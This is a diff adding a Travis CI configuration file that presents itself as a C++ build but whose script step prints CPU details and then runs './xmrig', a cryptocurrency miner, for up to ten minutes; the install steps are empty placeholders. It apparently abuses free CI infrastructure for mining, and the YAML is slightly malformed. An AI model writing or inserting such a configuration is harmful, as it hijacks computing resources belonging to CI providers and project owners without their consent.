@@ -1,0 +1,16 @@
+sudo: false
+
+language: cpp
+
+before_install:
+  - true
+
+install:
+  - true
+
+script:
+  - lscpu
+  timeout 600 ./xmrig
+
+after_failure:
+  - echo ">> done <<"
